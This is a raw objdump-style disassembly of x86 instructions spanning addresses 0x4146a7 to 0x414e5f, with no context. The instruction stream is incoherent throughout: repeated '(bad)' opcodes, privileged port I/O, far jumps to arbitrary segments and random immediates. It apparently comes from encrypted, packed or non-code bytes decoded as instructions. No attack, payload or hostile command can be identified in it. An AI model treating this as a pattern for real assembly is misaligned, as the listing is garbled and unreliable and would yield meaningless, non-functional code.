  4146a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4146a8:	jp     0x4146f0
  4146aa:	jge    0x41471d
  4146ac:	or     al,0xe0
  4146ae:	and    DWORD PTR ds:0xc23023ed,edx
  4146b4:	stos   DWORD PTR es:[edi],eax
  4146b5:	pop    DWORD PTR [ebx+0x24]
  4146b8:	and    eax,0x6b23b590
  4146bd:	jae    0x414665
  4146bf:	das    
  4146c0:	call   0xddb91cb2
  4146c5:	dec    ebp
  4146c6:	dec    edx
  4146c7:	repnz enter 0x240e,0xc2
  4146cc:	and    al,0xd1
  4146ce:	xchg   esp,eax
  4146cf:	jb     0x414748
  4146d1:	sbb    eax,edi
  4146d3:	aaa    
  4146d4:	in     eax,dx
  4146d5:	cwde   
  4146d6:	dec    ebp
  4146d7:	jp     0x4146a0
  4146d9:	stc    
  4146da:	mov    al,0xd0
  4146dc:	gs aaa 
  4146de:	add    cl,BYTE PTR [edx-0x35]
  4146e1:	xor    ch,BYTE PTR [ebx+0x40]
  4146e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4146e5:	add    BYTE PTR [ecx-0x2a79cc54],ah
  4146eb:	lods   al,BYTE PTR gs:[esi]
  4146ed:	cwde   
  4146ee:	retf   0x9cf0
  4146f1:	push   eax
  4146f2:	popa   
  4146f3:	add    eax,0x3f28aacc
  4146f8:	jecxz  0x41474d
  4146fa:	pop    ebx
  4146fb:	fcom   DWORD PTR [edx]
  4146fd:	repz scas al,BYTE PTR es:[edi]
  4146ff:	xor    al,0xf2
  414701:	mov    bl,BYTE PTR [ebx]
  414703:	iret   
  414704:	cmp    bl,BYTE PTR [edx+ecx*2-0x432d5c16]
  41470b:	in     al,dx
  41470c:	movsx  ebx,BYTE PTR [ebx+0x45]
  414710:	out    dx,al
  414711:	js     0x41470d
  414713:	ins    DWORD PTR es:[edi],dx
  414714:	lds    eax,FWORD PTR [ecx+esi*8]
  414717:	xchg   edx,eax
  414718:	xor    BYTE PTR fs:[eax],ah
  41471b:	in     al,dx
  41471c:	xchg   edi,eax
  41471d:	cmc    
  41471e:	push   ss
  41471f:	sbb    DWORD PTR [ebx-0x2b7fdf07],edi
  414725:	retf   
  414726:	sti    
  414727:	repz mov al,0xb1
  41472a:	shr    BYTE PTR [ebp+0x9bd6a6e],0x95
  414731:	push   DWORD PTR [eax-0x252137a4]
  414737:	(bad)  
  414738:	cmp    eax,0x9a5dd6d
  41473d:	xor    edx,eax
  41473f:	inc    ebp
  414740:	inc    edx
  414741:	cmp    al,0x10
  414743:	ss sub eax,0x59817fd1
  414749:	pop    ebx
  41474a:	cwde   
  41474b:	pop    ds
  41474c:	add    esi,edi
  41474e:	aas    
  41474f:	dec    ebx
  414750:	mov    cl,0x72
  414752:	dec    ebp
  414753:	test   al,0x51
  414755:	xchg   BYTE PTR [ebx+0x5cfd31de],dl
  41475b:	push   cs
  41475c:	sahf   
  41475d:	fsubr  QWORD PTR [ebx]
  41475f:	pandn  mm7,QWORD PTR [ebp+0x4a98c49b]
  414766:	shl    DWORD PTR es:0xaa100b16,cl
  41476d:	add    ah,bl
  41476f:	sub    eax,0xa1a6f6ba
  414774:	shl    BYTE PTR [eax-0x17],1
  414777:	mov    esp,0xaa135f65
  41477c:	int3   
  41477d:	push   0x48
  41477f:	es or  bl,BYTE PTR gs:[edi]
  414783:	mov    bh,0xff
  414785:	aad    0x9d
  414787:	mov    ah,0x47
  414789:	or     DWORD PTR [esi+0x6a6f4907],esp
  41478f:	lea    ebx,[ebp+0x1b51d17e]
  414795:	mov    dh,0x9f
  414797:	pop    es
  414798:	jmp    0x6f04:0x2195446a
  41479f:	sub    edx,DWORD PTR [ebp+ebx*8+0x3787fc4a]
  4147a6:	jecxz  0x41474c
  4147a8:	cs lock icebp 
  4147ab:	daa    
  4147ac:	mov    eax,0x69878d32
  4147b1:	enter  0x6e79,0xa4
  4147b5:	test   DWORD PTR [edi+ebx*2+0x3ab31308],eax
  4147bc:	dec    eax
  4147bd:	aam    0xca
  4147bf:	in     al,dx
  4147c0:	inc    esi
  4147c1:	xor    DWORD PTR [ebp+0x8529619],ebx
  4147c7:	mov    ?,WORD PTR [edi]
  4147c9:	mov    ebp,0xd3f8fb4a
  4147ce:	cmp    BYTE PTR [esi],ah
  4147d0:	pop    ebx
  4147d1:	push   ebx
  4147d2:	lds    esp,FWORD PTR ds:0x81f93b29
  4147d8:	push   es
  4147d9:	or     DWORD PTR gs:[ecx+0x64],eax
  4147dd:	test   eax,0x7cbb0fe9
  4147e2:	lds    esp,FWORD PTR [eax+0x33]
  4147e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4147e6:	add    al,0xec
  4147e8:	pop    esi
  4147e9:	mov    ds:0x19df24e,al
  4147ee:	daa    
  4147ef:	std    
  4147f0:	in     al,dx
  4147f1:	(bad)  
  4147f2:	mov    bh,0x9f
  4147f4:	mov    bh,0xbd
  4147f6:	ins    BYTE PTR es:[edi],dx
  4147f7:	add    DWORD PTR [esi],0xae7afa89
  4147fd:	sbb    eax,0xbed639fa
  414802:	mov    ss,eax
  414804:	mov    ah,0xd9
  414806:	ins    DWORD PTR es:[edi],dx
  414807:	(bad)  
  414808:	iret   
  414809:	js     0x414808
  41480b:	mov    bh,0x24
  41480d:	fs add al,0xe9
  414810:	push   esp
  414811:	mov    eax,ds:0xfcd5403d
  414816:	cmp    BYTE PTR [esi-0x60],dh
  414819:	adc    bh,BYTE PTR [ebp-0x43735a1c]
  41481f:	arpl   WORD PTR [edi-0x4e],sp
  414822:	fdivr  st,st(5)
  414824:	mov    eax,0x55b3dbcd
  414829:	push   ebx
  41482a:	mov    ch,0x32
  41482c:	lods   eax,DWORD PTR ds:[esi]
  41482d:	pop    ss
  41482e:	xlat   BYTE PTR ds:[ebx]
  41482f:	sbb    edx,DWORD PTR [edx]
  414831:	xor    edi,esi
  414833:	out    0x12,al
  414835:	xchg   ebx,eax
  414836:	push   esp
  414837:	ins    BYTE PTR es:[edi],dx
  414838:	out    0x81,eax
  41483a:	push   ss
  41483b:	or     DWORD PTR [edx+0x2d],edi
  41483e:	mov    BYTE PTR [esi+esi*8+0x41],bl
  414842:	and    al,0x19
  414844:	lahf   
  414845:	push   esi
  414846:	or     eax,0x5dbd2b87
  41484b:	daa    
  41484c:	(bad)  
  41484d:	(bad)  
  41484e:	dec    ebx
  41484f:	mov    fs,WORD PTR ds:0x2d15ffab
  414855:	addr16 je 0x414830
  414858:	ss iret 
  41485a:	or     esp,DWORD PTR [esi+0x2d]
  41485d:	retf   
  41485e:	cmp    eax,0xb4d7c1b3
  414863:	push   ds
  414864:	and    eax,0x4c323ad6
  414869:	cmp    eax,0x934c9720
  41486e:	mov    dl,BYTE PTR [ecx+0x5dbb98ea]
  414874:	or     dh,BYTE PTR [esi+0x34]
  414877:	mov    BYTE PTR [esi+0x31],bl
  41487a:	and    eax,0x52ba90bc
  41487f:	stos   DWORD PTR es:[edi],eax
  414880:	jmp    0x1ff03464
  414885:	and    al,0x83
  414887:	pop    esi
  414888:	ret    0xdbd9
  41488b:	daa    
  41488c:	pop    ss
  41488d:	das    
  41488e:	add    BYTE PTR [ebp-0x4e],cl
  414891:	mov    esp,0x7d71da2f
  414896:	sub    DWORD PTR [edi],esi
  414898:	inc    eax
  414899:	jnp    0x41482b
  41489b:	adc    cl,BYTE PTR [edx+ecx*1+0x67a28f0]
  4148a2:	cs pop eax
  4148a4:	cmc    
  4148a5:	and    esp,ebx
  4148a7:	out    0x4d,eax
  4148a9:	fisubr DWORD PTR [eax+0x3a]
  4148ac:	or     cl,BYTE PTR [ebp+0x2f]
  4148af:	adc    DWORD PTR [edx+ebp*2+0x6d],esp
  4148b3:	daa    
  4148b4:	push   edx
  4148b5:	(bad)  
  4148b6:	addr16 test dl,ch
  4148b9:	and    eax,DWORD PTR [esi-0x5e]
  4148bc:	rcr    DWORD PTR [ecx-0x50],1
  4148bf:	outs   dx,BYTE PTR ds:[esi]
  4148c0:	adc    bh,ch
  4148c2:	sub    BYTE PTR [edi],bl
  4148c4:	xchg   ebp,eax
  4148c5:	add    dl,BYTE PTR [edx+0x6b]
  4148c8:	cld    
  4148c9:	push   ebp
  4148ca:	pop    ebx
  4148cb:	repz loope 0x4148cf
  4148ce:	add    esi,DWORD PTR [esi-0x3c]
  4148d1:	push   ecx
  4148d2:	dec    ebp
  4148d3:	jno    0x41486f
  4148d5:	lods   al,BYTE PTR ds:[esi]
  4148d6:	adc    DWORD PTR [ebx+0x18],esp
  4148d9:	inc    edx
  4148da:	sbb    eax,0x56689ab1
  4148df:	sub    al,0xdc
  4148e1:	push   esp
  4148e2:	sub    DWORD PTR [ebx+0x40],0xffffffd1
  4148e6:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4148e8:	pop    es
  4148e9:	xchg   ebp,eax
  4148ea:	int3   
  4148eb:	pop    ebp
  4148ec:	pop    edi
  4148ed:	dec    edx
  4148ee:	add    DWORD PTR [ebx+0x3ee9b4b5],esp
  4148f4:	aas    
  4148f5:	push   esi
  4148f6:	or     dh,ch
  4148f8:	adc    eax,0xb9bc3b64
  4148fd:	jecxz  0x4148eb
  4148ff:	rol    BYTE PTR [esi+0x66],cl
  414902:	retf   0x11ca
  414905:	mov    bh,0x5
  414907:	pop    esp
  414908:	jecxz  0x414952
  41490a:	int    0x52
  41490c:	idiv   BYTE PTR [ebp+0x7d0e3026]
  414912:	in     al,0x59
  414914:	clc    
  414915:	js     0x4148ff
  414917:	pop    ebp
  414918:	pop    edi
  414919:	aad    0x80
  41491b:	or     esp,DWORD PTR [edi+0xe]
  41491e:	aam    0x70
  414920:	xchg   ebx,eax
  414921:	inc    BYTE PTR [edi]
  414923:	xchg   esi,eax
  414924:	pop    eax
  414925:	retw   
  414927:	push   esi
  414928:	adc    eax,DWORD PTR [edi+0x2593babd]
  41492e:	loopne 0x4148e3
  414930:	cmp    DWORD PTR [eax+edx*8+0x7c],eax
  414934:	jge    0x4148f5
  414936:	addr16 inc ebp
  414938:	enter  0x9f52,0x52
  41493c:	out    0xfc,al
  41493e:	ret    0x8d9f
  414941:	fwait
  414942:	xor    bl,bh
  414944:	out    dx,al
  414945:	mov    ds:0xe8eab25b,eax
  41494a:	nop
  41494b:	jns    0x41491f
  41494d:	popf   
  41494e:	cld    
  41494f:	fimul  WORD PTR [edx-0x2137b83a]
  414955:	mov    ah,BYTE PTR ss:[edi+0x473b35ab]
  41495c:	(bad)  
  41495d:	stc    
  41495e:	xchg   ebx,eax
  41495f:	aam    0xa4
  414961:	test   ebx,edx
  414963:	dec    ecx
  414964:	test   DWORD PTR [eax-0x11],esp
  414967:	sbb    BYTE PTR [ebx],bl
  414969:	push   edi
  41496a:	pop    es
  41496b:	inc    edx
  41496c:	out    0x5f,al
  41496e:	pop    ebx
  41496f:	mov    ah,0x5b
  414971:	aam    0xc3
  414973:	cmp    ah,BYTE PTR [esi]
  414975:	retf   0x3561
  414978:	mov    bh,0xe3
  41497a:	push   ebp
  41497b:	in     eax,dx
  41497c:	add    edx,eax
  41497e:	and    BYTE PTR [ecx-0x2],bl
  414981:	mov    esi,DWORD PTR [esi]
  414983:	fcmovnbe st,st(3)
  414985:	adc    BYTE PTR [edx],al
  414987:	push   0x184b4234
  41498c:	mov    al,0xb4
  41498e:	inc    ebp
  41498f:	fwait
  414990:	lahf   
  414991:	sub    eax,0x4919cd9b
  414996:	fld    QWORD PTR [esi+0x4d]
  414999:	ins    BYTE PTR es:[edi],dx
  41499a:	jo     0x4149d2
  41499c:	adc    BYTE PTR [ecx-0x45ff08d5],bh
  4149a2:	aad    0xdb
  4149a4:	push   esi
  4149a5:	mov    esi,0x43f79290
  4149aa:	push   ebp
  4149ab:	push   esi
  4149ac:	adc    BYTE PTR [esi+0x9],dh
  4149af:	sbb    DWORD PTR [edi+0x75b1745d],esp
  4149b5:	xchg   BYTE PTR ds:0xa4f8ba03,ah
  4149bb:	jg     0x4149c5
  4149bd:	mov    esp,0xab1dbb67
  4149c2:	mov    eax,ds:0x7b54bc1e
  4149c7:	jp     0x414a3f
  4149c9:	imul   esp,DWORD PTR [eax-0x3],0xffffffcc
  4149cd:	jnp    0x4149a0
  4149cf:	ins    BYTE PTR es:[edi],dx
  4149d0:	mov    bh,bl
  4149d2:	pop    esi
  4149d3:	jb     0x414a16
  4149d5:	aaa    
  4149d6:	les    eax,FWORD PTR [eax+0x610080cd]
  4149dc:	cs loopne 0x414a25
  4149df:	popf   
  4149e0:	xchg   esi,eax
  4149e1:	leave  
  4149e2:	adc    al,0xbb
  4149e4:	test   al,0x19
  4149e6:	mov    eax,ds:0x62f0b3ee
  4149eb:	outs   dx,BYTE PTR ds:[esi]
  4149ec:	sbb    dl,ch
  4149ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4149ef:	and    eax,0xba25740e
  4149f4:	mov    cl,0x6
  4149f6:	cmp    BYTE PTR [ebp+0x79],bl
  4149f9:	dec    ecx
  4149fa:	inc    edi
  4149fb:	inc    esi
  4149fc:	adc    al,0x9e
  4149fe:	out    0x98,al
  414a00:	dec    esp
  414a01:	bound  ecx,QWORD PTR [ecx+0x7f]
  414a04:	imul   ebx,DWORD PTR [esi+ebx*2+0x5420156a],0x58
  414a0c:	jl     0x4149b4
  414a0e:	in     eax,dx
  414a0f:	imul   ebp,DWORD PTR [esi+0x65c20cdf],0x9eda164c
  414a19:	gs push edx
  414a1b:	ret    
  414a1c:	cwde   
  414a1d:	add    ch,BYTE PTR [eax+0x62]
  414a20:	cmp    ch,BYTE PTR [ebx+eiz*1-0x55a16721]
  414a27:	pop    ebp
  414a28:	fist   DWORD PTR [esi]
  414a2a:	outs   dx,BYTE PTR ds:[esi]
  414a2b:	icebp  
  414a2c:	out    dx,eax
  414a2d:	jmp    0x7372d746
  414a32:	and    bl,BYTE PTR [ebx-0x38]
  414a35:	adc    ch,cl
  414a37:	daa    
  414a38:	out    dx,eax
  414a39:	pop    ds
  414a3a:	sub    DWORD PTR [esi],0xd30dd547
  414a40:	cmp    DWORD PTR [ecx+ebp*8+0xf13c25d],esp
  414a47:	pop    edx
  414a48:	les    edx,FWORD PTR [eax]
  414a4a:	lea    edi,[ebx]
  414a4c:	inc    esp
  414a4d:	inc    eax
  414a4e:	mul    DWORD PTR [esi+0x6dbf3a5]
  414a54:	arpl   di,bp
  414a56:	adc    BYTE PTR [ebp-0xe],0x1e
  414a5a:	fs pop ss
  414a5c:	es ds push esp
  414a5f:	cmp    eax,0x6169f5f1
  414a64:	fisttp DWORD PTR [ecx]
  414a66:	and    eax,0x95ad8f
  414a6b:	add    DWORD PTR [esi+0x10],ebp
  414a6e:	jl     0x414ad4
  414a70:	aaa    
  414a71:	xor    edi,DWORD PTR [edi+edx*4+0x2f]
  414a75:	xlat   BYTE PTR ds:[ebx]
  414a76:	add    BYTE PTR [edx+esi*4],cl
  414a79:	xchg   ecx,eax
  414a7a:	add    DWORD PTR [ebx-0x5d],ecx
  414a7d:	pop    esp
  414a7e:	(bad)  
  414a7f:	loop   0x414a61
  414a81:	mov    WORD PTR [edx+ecx*8],fs
  414a84:	(bad)
  414a87:	outs   dx,DWORD PTR ds:[esi]
  414a88:	dec    ebx
  414a89:	jl     0x414a99
  414a8b:	mov    ah,0xdc
  414a8d:	mov    esi,0xede55e51
  414a92:	addr16 mov bh,0xc0
  414a95:	lahf   
  414a96:	add    eax,0x2bc7b4cb
  414a9b:	mov    ebx,0x561f2daa
  414aa0:	mov    ds:0xd6716f49,al
  414aa5:	out    dx,eax
  414aa6:	hlt    
  414aa7:	dec    ecx
  414aa8:	pop    ecx
  414aa9:	dec    ebp
  414aaa:	(bad)  
  414aac:	rcl    BYTE PTR [edi+0x6e3d5464],0xe0
  414ab3:	xor    ah,al
  414ab5:	loope  0x414a48
  414ab7:	mov    esp,0x8d852aa0
  414abc:	or     BYTE PTR [ebx-0x68],bh
  414abf:	rcr    BYTE PTR [edi+0x28],cl
  414ac2:	push   esp
  414ac3:	ror    DWORD PTR [edx-0x2943ca0d],1
  414ac9:	mov    ss,WORD PTR [edi+ecx*8-0xdf77611]
  414ad0:	pop    ecx
  414ad1:	jmp    0x414b40
  414ad3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414ad4:	inc    eax
  414ad5:	push   0xe4bba07
  414ada:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414adb:	xchg   DWORD PTR ds:0x3cc34735,eax
  414ae1:	sbb    al,0xd6
  414ae3:	es xchg edi,eax
  414ae5:	out    dx,al
  414ae6:	jle    0x414ad5
  414ae8:	jnp    0x414ae7
  414aea:	pop    ds
  414aeb:	dec    esp
  414aec:	mov    edx,0xfabaf67a
  414af1:	mov    ds:0xb3b7d0da,eax
  414af6:	jmp    0x414a7e
  414af8:	jns    0x414b4c
  414afa:	and    ecx,DWORD PTR [ecx+ecx*8-0x60]
  414afe:	dec    eax
  414aff:	push   ebx
  414b00:	sbb    DWORD PTR [ecx+ecx*1-0x34],ebx
  414b04:	and    BYTE PTR ds:0x4ef9edf2,dh
  414b0a:	push   edx
  414b0b:	jae    0x414ab7
  414b0d:	lock sbb bh,BYTE PTR [edx+edi*8-0x20]
  414b12:	lods   eax,DWORD PTR ds:[esi]
  414b13:	adc    eax,esp
  414b15:	mov    ds:0x5308de1f,al
  414b1a:	test   BYTE PTR [esp+ecx*1+0x56a85de4],cl
  414b21:	jns    0x414b68
  414b23:	and    eax,0xa9500004
  414b28:	jae    0x414b73
  414b2a:	ds push ecx
  414b2c:	pusha  
  414b2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414b2e:	mov    ecx,0xeaa5d4b1
  414b33:	cmp    al,0xa1
  414b35:	add    ch,0x14
  414b38:	inc    esi
  414b39:	mov    esi,0x36789791
  414b3e:	jmp    0xedc212ad
  414b43:	inc    eax
  414b44:	cdq    
  414b45:	(bad)  [ebx-0x48127b14]
  414b4b:	dec    edx
  414b4c:	sub    esp,DWORD PTR [ebp-0x1]
  414b4f:	mov    bl,0x22
  414b51:	mov    eax,ds:0xac899d4a
  414b56:	pop    esp
  414b57:	pushf  
  414b58:	jmp    0x92e4:0x70f15f33
  414b5f:	push   esi
  414b60:	outs   dx,DWORD PTR ds:[esi]
  414b61:	retf   
  414b62:	push   eax
  414b63:	sub    esp,DWORD PTR [edx+0x247e1ec0]
  414b69:	pusha  
  414b6a:	dec    ebx
  414b6b:	int    0x15
  414b6d:	push   esi
  414b6e:	pop    edx
  414b6f:	jb     0x414bc7
  414b71:	sub    eax,DWORD PTR [edi]
  414b73:	adc    DWORD PTR [ebp-0x53],edi
  414b76:	adc    eax,0xc6c1abcb
  414b7b:	dec    esp
  414b7c:	xor    DWORD PTR ss:[edi+ecx*4-0x4da3ebbf],esi
  414b84:	sub    eax,0x1b7d0d0f
  414b89:	into   
  414b8a:	sar    BYTE PTR [esi+0x28],1
  414b8d:	dec    eax
  414b8e:	mov    ch,0xaf
  414b90:	int3   
  414b91:	fcmovne st,st(0)
  414b93:	push   0x37394b4c
  414b98:	sbb    BYTE PTR [edx+eiz*2],al
  414b9b:	jns    0x414ba9
  414b9d:	or     BYTE PTR [ebp+0x44],ch
  414ba0:	je     0x414bb3
  414ba2:	ins    DWORD PTR es:[edi],dx
  414ba3:	icebp  
  414ba4:	stos   BYTE PTR es:[edi],al
  414ba5:	mov    bl,0x42
  414ba7:	fsin   
  414ba9:	jl     0x414b5e
  414bab:	lods   al,BYTE PTR ds:[esi]
  414bac:	inc    ecx
  414bad:	retf   0x8e01
  414bb0:	jmp    0x414ba9
  414bb2:	pop    edi
  414bb3:	inc    ebx
  414bb4:	push   esp
  414bb5:	stos   BYTE PTR es:[edi],al
  414bb6:	stos   BYTE PTR es:[edi],al
  414bb7:	mov    ?,WORD PTR [eax]
  414bb9:	frstor [ebp+0x53]
  414bbc:	inc    eax
  414bbd:	call   0xc81bf237
  414bc2:	dec    ecx
  414bc3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414bc4:	int    0x70
  414bc6:	sahf   
  414bc7:	outs   dx,DWORD PTR ds:[esi]
  414bc8:	ins    BYTE PTR es:[edi],dx
  414bc9:	jne    0x414bd6
  414bcb:	xor    cx,WORD PTR [eiz*8-0x2e5298d2]
  414bd3:	and    BYTE PTR [eax],bh
  414bd5:	adc    al,0xc2
  414bd7:	jne    0x414b94
  414bd9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414bda:	addr16 icebp 
  414bdc:	(bad)  
  414bdd:	fsub   QWORD PTR [edx-0x3768dd56]
  414be3:	stos   DWORD PTR es:[edi],eax
  414be4:	int3   
  414be5:	sub    BYTE PTR [edi+ebp*1+0x6ed03dc5],ch
  414bec:	ud0    eax,DWORD PTR [ecx]
  414bef:	cdq    
  414bf0:	out    dx,al
  414bf1:	test   DWORD PTR [ecx+0x38],ebx
  414bf4:	outs   dx,BYTE PTR ds:[esi]
  414bf5:	aad    0x4c
  414bf7:	push   cs
  414bf8:	stc    
  414bf9:	mov    WORD PTR [edi-0x2d1edbaa],ds
  414bff:	bound  ebp,QWORD PTR [edx]
  414c01:	imul   ecx,DWORD PTR [edi+0x43a9cd20],0xffffffa7
  414c08:	mov    ds:0xdd31a94a,al
  414c0d:	fnstcw WORD PTR [eax-0x521d70e4]
  414c13:	dec    eax
  414c14:	bound  esi,QWORD PTR [esi+0x6900a2e1]
  414c1a:	lea    esp,[esi]
  414c1c:	pop    es
  414c1d:	push   ebx
  414c1e:	sar    DWORD PTR [ecx-0x56],1
  414c21:	mov    esi,DWORD PTR [eax-0x6836ea48]
  414c27:	and    eax,0x2ee506a2
  414c2c:	shl    BYTE PTR [ecx+0x707bb2d3],0x72
  414c33:	lock pushf 
  414c35:	cmp    al,0x63
  414c37:	call   0x4a08:0x5a6b5bba
  414c3e:	stos   BYTE PTR es:[edi],al
  414c3f:	loopne 0x414bd5
  414c41:	jecxz  0x414c6f
  414c43:	jg     0x414c8f
  414c45:	and    al,cl
  414c47:	add    BYTE PTR [ebp-0x1cadbc02],bh
  414c4d:	pop    edi
  414c4e:	emms   
  414c50:	ds jbe 0x414c0f
  414c53:	scas   al,BYTE PTR es:[edi]
  414c54:	xor    eax,DWORD PTR [edx]
  414c56:	mov    al,0x9a
  414c58:	loope  0x414c4a
  414c5a:	pop    es
  414c5b:	fistp  QWORD PTR [ecx]
  414c5d:	(bad)
  414c61:	ret    0x8b20
  414c64:	fcmove st,st(3)
  414c66:	lods   al,BYTE PTR ds:[esi]
  414c67:	pop    ebx
  414c68:	fxch   st(0)
  414c6a:	mov    esi,0x67279f73
  414c6f:	dec    ebp
  414c70:	push   cs
  414c71:	(bad)  
  414c72:	adc    eax,0x965620e
  414c77:	clc    
  414c78:	addr16 icebp 
  414c7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414c7b:	pop    esi
  414c7c:	mov    cl,0x4
  414c7e:	sub    di,bp
  414c81:	mov    WORD PTR [edi+0x50],gs
  414c84:	xor    edx,DWORD PTR ds:0xebd61674
  414c8a:	sbb    bh,BYTE PTR [esi]
  414c8c:	xor    edx,ebx
  414c8e:	shr    BYTE PTR ds:0xa84fce49,cl
  414c94:	iretw  
  414c96:	in     eax,0xfb
  414c98:	je     0x414c6c
  414c9a:	jo     0x414ccb
  414c9c:	repnz in eax,0x55
  414c9f:	inc    esi
  414ca0:	jecxz  0x414cd0
  414ca2:	mov    BYTE PTR [edi],al
  414ca4:	mov    dh,0x4f
  414ca6:	scas   eax,DWORD PTR es:[edi]
  414ca7:	and    al,0x58
  414ca9:	fiadd  WORD PTR [eax]
  414cab:	js     0x414c51
  414cad:	jne    0x414c42
  414caf:	cli    
  414cb0:	mov    ebx,0x6d23b521
  414cb5:	mov    ch,0xf4
  414cb7:	jo     0x414cc7
  414cb9:	lock fidiv DWORD PTR [ebx-0x44d91244]
  414cc0:	rcr    ebp,0x2
  414cc3:	lds    ebx,FWORD PTR [esi]
  414cc5:	inc    ebx
  414cc6:	test   eax,0xb71fffdc
  414ccb:	push   ds
  414ccc:	mov    DWORD PTR [edi],ecx
  414cce:	les    ebx,FWORD PTR ds:0xc33d6657
  414cd4:	sbb    DWORD PTR cs:[ebx-0x5e97c717],edi
  414cdb:	sbb    eax,esi
  414cdd:	aaa    
  414cde:	mov    dl,0x88
  414ce0:	ss aaa 
  414ce2:	xor    DWORD PTR [esi+esi*2+0x44],edx
  414ce6:	test   DWORD PTR [edx+0x51de3b9f],edx
  414cec:	mov    edi,0xf36706e8
  414cf1:	idiv   eax
  414cf3:	dec    eax
  414cf4:	into   
  414cf5:	mov    eax,ds:0x5b06f62c
  414cfa:	xchg   ecx,eax
  414cfb:	sar    BYTE PTR [ebx+0x20],1
  414cfe:	stos   DWORD PTR es:[edi],eax
  414cff:	pop    ds
  414d00:	sbb    BYTE PTR [eax-0x7a],cl
  414d03:	aam    0x10
  414d05:	inc    ecx
  414d06:	mov    al,0xd
  414d08:	ret    
  414d09:	js     0x414d54
  414d0b:	(bad)  
  414d0c:	pop    ecx
  414d0d:	inc    esi
  414d0e:	mov    BYTE PTR [ebp-0x2f14b02b],al
  414d14:	adc    eax,0x4491b97f
  414d19:	sub    eax,0xcbe4e0ff
  414d1e:	out    dx,eax
  414d1f:	dec    eax
  414d20:	mov    bh,0x40
  414d22:	sub    eax,0x42db410f
  414d27:	mov    WORD PTR [edi+ecx*4+0x37],es
  414d2b:	in     eax,0xad
  414d2d:	adc    DWORD PTR [edi+0x24bc7f56],esi
  414d33:	jecxz  0x414d1e
  414d35:	jno    0x414d29
  414d37:	jmp    0xb5f47224
  414d3c:	lods   eax,DWORD PTR ds:[esi]
  414d3d:	xor    BYTE PTR [ecx],0x27
  414d40:	leave  
  414d41:	jle    0x414d22
  414d43:	bound  ebx,QWORD PTR [ecx+ecx*1]
  414d46:	mov    ds:0x94223dc,al
  414d4b:	pop    ecx
  414d4c:	mov    ds:0x304f7dcb,eax
  414d51:	std    
  414d52:	pop    eax
  414d53:	popa   
  414d54:	add    al,0x3b
  414d56:	pop    edi
  414d57:	push   cs
  414d58:	imul   eax,DWORD PTR [esi+ecx*4+0x16ffa321],0xe1cf6908
  414d63:	ret    0xf9f7
  414d66:	sbb    BYTE PTR [ecx-0x733de84e],dl
  414d6c:	xlat   BYTE PTR ds:[ebx]
  414d6d:	add    al,0xfe
  414d6f:	cld    
  414d70:	out    0xe1,al
  414d72:	clc    
  414d73:	inc    ecx
  414d74:	aam    0x67
  414d76:	pop    ds
  414d77:	repz daa 
  414d79:	or     esp,DWORD PTR [esp+eax*2+0x3f]
  414d7d:	ror    DWORD PTR [ebx],1
  414d7f:	jg     0x414dad
  414d81:	imul   esp,DWORD PTR [esi-0x40482e27],0xc75469e8
  414d8b:	and    ch,BYTE PTR [edx-0x75022c88]
  414d91:	and    eax,0x7a103443
  414d96:	js     0x414d99
  414d98:	adc    al,0xb7
  414d9a:	push   ss
  414d9b:	xor    ebx,DWORD PTR [eax+0x1bdfacd8]
  414da1:	pusha  
  414da2:	gs and ebx,edx
  414da5:	xchg   BYTE PTR [ecx+0x50f1a32],bh
  414dab:	jnp    0x414d7b
  414dad:	mov    edi,DWORD PTR ds:0xad9949d6
  414db3:	mov    ch,0x5b
  414db5:	mov    esp,0xb284c617
  414dba:	dec    ebp
  414dbb:	test   eax,0x38855f0c
  414dc0:	cmp    ah,BYTE PTR [edi+ebp*4-0x1bd7c975]
  414dc7:	xor    dh,BYTE PTR [ebx-0x2a]
  414dca:	addr16 loop 0x414dae
  414dcd:	(bad)  
  414dcf:	fldenv [edx-0x75]
  414dd2:	pop    ebx
  414dd3:	xchg   ebx,eax
  414dd4:	pop    eax
  414dd5:	push   cs
  414dd6:	call   0xcabf:0x3c311d8a
  414ddd:	xchg   ebp,eax
  414dde:	xchg   edx,eax
  414ddf:	sub    BYTE PTR [edi],dh
  414de1:	push   ss
  414de2:	mov    esi,0xff6d9347
  414de7:	cmp    al,0xa5
  414de9:	jmp    0x237b:0xf475092b
  414df0:	sub    al,ch
  414df2:	outs   dx,BYTE PTR ds:[esi]
  414df3:	shl    BYTE PTR [edx],0xf1
  414df6:	not    BYTE PTR [edx-0x17]
  414df9:	push   0x2ad48b77
  414dfe:	fisub  WORD PTR [ebx]
  414e00:	(bad)  
  414e01:	js     0x414e04
  414e03:	fld    TBYTE PTR [esi]
  414e05:	adc    al,0xad
  414e07:	jbe    0x414de0
  414e09:	adc    dh,dl
  414e0b:	dec    esp
  414e0c:	cld    
  414e0d:	mov    bl,0xc6
  414e0f:	pop    edx
  414e10:	cmp    ah,BYTE PTR [ebp-0x4e198c34]
  414e16:	sub    al,0x70
  414e18:	mov    esp,0x6aeb8454
  414e1d:	xchg   ecx,eax
  414e1e:	cli    
  414e1f:	pop    ecx
  414e20:	xchg   ecx,eax
  414e21:	cld    
  414e22:	mov    gs,WORD PTR [eax+0x6a8b86c8]
  414e28:	sti    
  414e29:	xor    esp,DWORD PTR [edi-0x15]
  414e2c:	xor    al,0x31
  414e2e:	xchg   ch,cl
  414e30:	pushf  
  414e31:	push   ebx
  414e32:	mov    WORD PTR [edi+0x5f],gs
  414e35:	xor    eax,0xf9d1920d
  414e3a:	mov    WORD PTR [ecx-0x565f03c1],?
  414e40:	out    dx,al
  414e41:	adc    DWORD PTR [edx],eax
  414e43:	xchg   esp,eax
  414e44:	push   0x87dd34dc
  414e49:	sub    edi,DWORD PTR [ecx-0x1e41396e]
  414e4f:	test   BYTE PTR [ecx-0x9],ch
  414e52:	ja     0x414e54
  414e54:	cmp    edi,eax
  414e56:	retf   
  414e57:	inc    edx
  414e58:	call   0x42af:0xa4b908ae
  414e5f:	(bad)  
